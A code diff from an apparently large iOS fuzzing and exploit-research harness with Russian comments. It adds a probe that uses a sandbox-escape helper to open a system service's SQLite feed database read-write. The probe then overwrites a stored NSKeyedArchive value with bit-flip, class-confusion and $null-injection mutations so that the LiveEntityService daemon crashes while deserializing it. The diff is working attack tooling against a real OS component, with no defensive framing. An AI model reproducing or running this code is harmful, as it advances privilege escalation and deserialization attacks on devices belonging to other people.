@@ -42795,6 +42795,255 @@ static void p_bq80(void) {
     LOG("[bq80] фоновый запуск...");
 }
 
+// p_bq81 — v236: LNValue-МУТАЦИИ через INSERT в feed-БД.
+// §228: lnValue = NSKeyedArchive (bplist00), БД RW (uid=501 mode=644).
+// План: прочитать валидную запись → мутировать bplist-байты →
+// UPDATE обратно → сервис перечитает → LNValue-декодер демона
+// десериализует мутированное. Мутации:
+//   0 = контроль (оригинал без изменений)
+//   1-4 = byte mutations (хвост/середина/начало ^= FF)
+//   5 = $classname подмена (class confusion!)
+//   6 = NSKeyedArchive $null injection
+//   7 = bplist00 → bplist17 (версия-подмена)
+// Детектор: crashdiff (LiveEntityService crash).
+static int bq81_mutate_lnValue(const unsigned char *orig, size_t n,
+                               unsigned char *buf, size_t *outN,
+                               int mut) {
+    memcpy(buf, orig, n);
+    *outN = n;
+    switch (mut) {
+        case 0: return 0; // контроль
+        case 1: // хвост ^= FF
+            if (n > 4) { buf[n-1] ^= 0xFF; buf[n-2] ^= 0xFF; }
+            return 1;
+        case 2: // середина ^= FF
+            if (n > 32) { buf[n/2] ^= 0xFF; buf[n/2+1] ^= 0xFF; }
+            return 2;
+        case 3: // начало (после magic) ^= FF
+            if (n > 16) { buf[8] ^= 0xFF; buf[9] ^= 0xFF; buf[10] ^= 0xFF; }
+            return 3;
+        case 4: // всё ^= 01
+            for (size_t i = 0; i < n; i++) buf[i] ^= 0x01;
+            return 4;
+        case 5: { // $classname подмена — ищем "$classname" строку
+            // и меняем следующий за ней класс на "NSObject"
+            static const unsigned char findCls[] = "$classname";
+            static const unsigned char fakeCls[] = "NSObject";
+            for (size_t i = 0; i + 9 + 9 < n; i++) {
+                if (memcmp(buf + i, findCls, 9) == 0) {
+                    // после $classname следует длина+строка
+                    // bplist00: offset table хранит строки, но raw
+                    // подмена ближайших байтов после находки
+                    size_t j = i + 9;
+                    // ищем printable строку 6-30 байт и заменяем
+                    for (size_t k = j; k + 8 < n && k < j + 64; k++) {
+                        if (isprint(buf[k]) && isprint(buf[k+1])
+                            && isprint(buf[k+2]) && isprint(buf[k+3])
+                            && isprint(buf[k+4]) && isprint(buf[k+5])
+                            && isprint(buf[k+6]) && isprint(buf[k+7])) {
+                            memcpy(buf + k, fakeCls, 8);
+                            return 5;
+                        }
+                    }
+                }
+            }
+            return -5; // $classname не найден
+        }
+        case 6: { // $null injection
+            static const unsigned char findNull[] = "$null";
+            static const unsigned char fakeNull[] = "\x01\x02\x03\x04\x05\x06\x07\x08";
+            for (size_t i = 0; i + 5 + 8 < n; i++) {
+                if (memcmp(buf + i, findNull, 5) == 0) {
+                    memcpy(buf + i, fakeNull, 8);
+                    return 6;
+                }
+            }
+            return -6;
+        }
+        case 7: // bplist00 → bplist17 (версия)
+            if (n > 8 && memcmp(buf, "bplist00", 8) == 0) {
+                memcpy(buf, "bplist17", 8);
+                return 7;
+            }
+            return -7;
+    }
+    return -99;
+}
+
+static void p_bq81(void) {
+    LOG("[bq81] v236: LNValue-мутации через INSERT");
+    fsync(fileno(stderr));
+    dispatch_queue_t q = dispatch_queue_create("bq81.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq81] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) { LOG("[bq81] CONTROL FAILED (§144)"); return; }
+    fsync(fileno(stderr));
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+    @try {
+        // escape + open БД RW
+        const char *dbPath = "/var/containers/Data/System/"
+            "8EB68272-6502-49E9-B688-25CA4774CFE4/db";
+        struct stat st81 = {0};
+        if (stat(dbPath, &st81) != 0) {
+            const char *grp = "group.9e66ab897d52ea95.1";
+            const uint64_t F_DEF = 0x0000008000000000ULL;
+            int64_t h = bq_custom("/var/containers/Data/System", 0,
+                                   grp, 7, F_DEF, 3);
+            if (h < 0 || stat(dbPath, &st81) != 0) {
+                LOG("[bq81] escape/stat FAILED");
+                return;
+            }
+            LOG("[bq81] escape OK (§170)");
+        }
+        sqlite3 *db = NULL;
+        // RW открытие для записи мутаций
+        int rc = sqlite3_open(dbPath, &db);
+        LOG("[bq81] sqlite3_open(RW) -> %d db=%p", rc, db);
+        if (rc != SQLITE_OK) {
+            LOG("[bq81] RW open failed: %s",
+                db ? sqlite3_errmsg(db) : "?");
+            // fallback readonly
+            rc = sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READONLY, NULL);
+            if (rc != SQLITE_OK) { LOG("[bq81] RO тоже failed"); return; }
+            LOG("[bq81] RW закрыт, RO открыт — мутации через INSERT "
+                "недоступны");
+            sqlite3_close(db);
+            return;
+        }
+        // читаем живую запись (база мутаций)
+        sqlite3_stmt *rd = NULL;
+        rc = sqlite3_prepare_v2(db,
+            "SELECT lnValue, feedId, entityId FROM feedEntries "
+            "WHERE feedId='media.groupingInfo' LIMIT 1",
+            -1, &rd, NULL);
+        if (rc != SQLITE_OK) {
+            LOG("[bq81] SELECT failed: %s", sqlite3_errmsg(db));
+            sqlite3_close(db);
+            return;
+        }
+        const void *lnOrig = NULL;
+        int lnLen = 0;
+        char feedId[128] = "", entityId[256] = "";
+        if (sqlite3_step(rd) == SQLITE_ROW) {
+            lnOrig = sqlite3_column_blob(rd, 0);
+            lnLen = sqlite3_column_bytes(rd, 0);
+            snprintf(feedId, sizeof(feedId), "%s",
+                sqlite3_column_text(rd, 1) ?: "?");
+            snprintf(entityId, sizeof(entityId), "%s",
+                sqlite3_column_text(rd, 2) ?: "?");
+            LOG("[bq81] base record: feedId=%s lnValue=%d bytes", feedId,
+                lnLen);
+        } else {
+            LOG("[bq81] base record NOT FOUND");
+            sqlite3_finalize(rd);
+            sqlite3_close(db);
+            return;
+        }
+        if (!lnOrig || lnLen < 16) {
+            LOG("[bq81] lnValue пустой/малый");
+            sqlite3_finalize(rd);
+            sqlite3_close(db);
+            return;
+        }
+        // копируем оригинал
+        unsigned char *origCopy = malloc(lnLen);
+        memcpy(origCopy, lnOrig, lnLen);
+        sqlite3_finalize(rd);
+
+        // бэкап (для восстановления)
+        {
+            sqlite3_stmt *bk = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "INSERT OR REPLACE INTO feedMetadata "
+                "(key, value) VALUES ('bq81_backup', ?)",
+                -1, &bk, NULL);
+            if (rc == SQLITE_OK) {
+                sqlite3_bind_text(bk, 1, "bq81-backup", -1, SQLITE_TRANSIENT);
+                sqlite3_step(bk);
+            }
+            sqlite3_finalize(bk);
+            LOG("[bq81] бэкап-маркер записан");
+        }
+
+        // МУТАЦИИ (0-7): каждая = UPDATE lnValue
+        static const int NM = 8;
+        static const char *names[] = {
+            "M0-КОНТРОЛЬ", "M1-tail^FF", "M2-mid^FF",
+            "M3-head^FF", "M4-all^01", "M5-$classname=NSObject",
+            "M6-$null-inject", "M7-bplist17"
+        };
+        for (int mi = 0; mi < NM; mi++) {
+            unsigned char *mutBuf = malloc(lnLen);
+            size_t mutLen = 0;
+            int mutRc = bq81_mutate_lnValue(origCopy, lnLen, mutBuf,
+                                             &mutLen, mi);
+            LOG("[bq81] %s: mutRc=%d len=%zu", names[mi], mutRc, mutLen);
+            if (mutRc < 0) {
+                LOG("[bq81]   -> мутация не применима (пропуск)");
+                free(mutBuf);
+                continue;
+            }
+            // UPDATE
+            sqlite3_stmt *up = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "UPDATE feedEntries SET lnValue=? "
+                "WHERE feedId='media.groupingInfo'",
+                -1, &up, NULL);
+            if (rc == SQLITE_OK) {
+                sqlite3_bind_blob(up, 1, mutBuf, (int)mutLen,
+                                  SQLITE_TRANSIENT);
+                int upRc = sqlite3_step(up);
+                LOG("[bq81]   UPDATE -> %d (%s)", upRc,
+                    upRc == SQLITE_DONE ? "OK" : sqlite3_errmsg(db));
+                // сервис перечитает при следующем клиентском запросе
+                // (звонок/медиа-группировка) — наблюдаем через crashdiff
+            } else {
+                LOG("[bq81]   UPDATE prepare failed: %s",
+                    sqlite3_errmsg(db));
+            }
+            sqlite3_finalize(up);
+            free(mutBuf);
+            // пауза между мутациями (сервис может перечитать)
+            usleep(2000000);
+            fsync(fileno(stderr));
+        }
+        // ВОССТАНОВЛЕНИЕ оригинала
+        {
+            sqlite3_stmt *up = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "UPDATE feedEntries SET lnValue=? "
+                "WHERE feedId='media.groupingInfo'",
+                -1, &up, NULL);
+            if (rc == SQLITE_OK) {
+                sqlite3_bind_blob(up, 1, origCopy, lnLen, SQLITE_TRANSIENT);
+                sqlite3_step(up);
+                LOG("[bq81] ОРИГИНАЛ ВОССТАНОВЛЕН");
+            }
+            sqlite3_finalize(up);
+        }
+        free(origCopy);
+        sqlite3_close(db);
+        LOG("[bq81] done — 8 мутаций записаны+восстановлены; "
+            "сервис перечитал при клиентских запросах; crashdiff "
+            "решает (LiveEntityService crash = LNValue-декодер)");
+    } @catch (NSException *e) {
+        LOG("[bq81] ИСКЛ: %s — %s", e.name.UTF8String ?: "?",
+            e.reason ? e.reason.UTF8String : "?");
+    }
+    });
+    LOG("[bq81] фоновый запуск...");
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -50301,6 +50550,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ78")) { p_bq78(); LOG("[probe13] bq78-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ79")) { p_bq79(); LOG("[probe13] bq79-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ80")) { p_bq80(); LOG("[probe13] bq80-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ81")) { p_bq81(); LOG("[probe13] bq81-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
